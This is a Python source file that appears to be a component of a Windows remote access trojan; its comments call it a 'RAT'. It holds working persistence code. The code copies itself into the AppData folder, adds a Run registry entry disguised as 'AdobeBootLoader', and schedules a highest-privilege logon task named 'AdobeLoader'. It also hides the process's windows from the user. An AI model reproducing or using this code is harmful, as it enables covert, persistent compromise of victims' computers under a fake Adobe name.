import linecache
from sys import exc_info, argv
from os import sep, path, environ, getppid
from shutil import copyfile
from winreg import *
from subprocess import Popen,PIPE
from win32gui import ShowWindow, EnumWindows
from win32con import SW_HIDE
from win32 import win32process


def PrintException():
	'''print exception info.'''
	exc_type, exc_obj, tb = exc_info()
	f = tb.tb_frame
	lineno = tb.tb_lineno
	filename = f.f_code.co_filename
	linecache.checkcache(filename)
	line = linecache.getline(filename, lineno, f.f_globals)
	print('Exception in ({}, LINE {} "{}"): {}'.format(filename,lineno,line.strip(),exc_obj))


def calc_len(js):
	'''calculate len of json object'''
	return str(len(bytes(js,encoding="utf-8")))

def update_registry():
	'''Create registry entry to run RAT on startup'''
	# entry name
	name = 'AdobeBootLoader'
	# key which we want to edit:
	keyValue = r'Software\Microsoft\Windows\CurrentVersion\Run'
	key2change = OpenKey(HKEY_CURRENT_USER, keyValue, 0, KEY_ALL_ACCESS)
	# check if reg. entry exists. stop here if it is
	# if its not, add reg. key
	for entry in range(1000):
		try:
			if EnumValue(key2change,entry)[0] == name:
				return
		except Exception as e:
			break


	# get RAT's name
	f_name = argv[0].split('\\')[-1]
	
	# get path to RAT
	f_path = path.dirname(path.realpath(f_name))
	full_path = f_path + sep + f_name
	# specify here the path to which you want to copy RAT
	copy_path = environ['appdata'] + sep + f_name
	if not path.exists(copy_path):
		copyfile(full_path,copy_path)

	# update registry
	# and schedule task on startup
	SetValueEx(key2change, name, 0, REG_SZ, '"'+copy_path+'"')
	proc = Popen(['schtasks', '/create', '/sc', 'onlogon', '/tn', 'AdobeLoader', '/rl', 'highest', '/tr','"'+copy_path+'"'],\
	stdout=PIPE,stderr=PIPE,shell=True)
	stdout,stderr = proc.communicate()
	#print(stdout.decode('cp866'))
	#print('Registry Updated!')


def hideWin(hwnd,pid):
	if win32process.GetWindowThreadProcessId(hwnd)[1] == pid:
		ShowWindow(hwnd, 0)

def hideWindow():
	# enum all windows and check with hidewin callback func.
	EnumWindows(hideWin,getppid())
